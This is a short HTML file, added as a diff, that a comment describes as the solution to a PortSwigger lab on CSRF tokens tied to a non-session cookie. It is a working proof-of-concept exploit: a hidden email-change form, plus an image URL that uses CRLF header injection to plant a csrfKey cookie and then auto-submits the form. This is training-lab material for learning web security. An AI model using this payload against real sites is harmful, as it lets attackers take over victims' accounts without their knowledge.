@@ -1,0 +1,12 @@
+<!-- The HTML payload below was meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie -->
+
+<html>
+    <body>
+        <form name="change-email-form" action="https://[SUB_DOMAIN].web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="wiener3@normal-user.net">
+            <input required="" type="hidden" name="csrf" value="[CSRF_TOKEN]">
+        </form>
+        <img src="https://[SUB_DOMAIN].web-security-academy.net/?search=shoes%0d%0aSet-Cookie:%20csrfKey=[CSRF_COOKIE]%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    </body>
+</html>
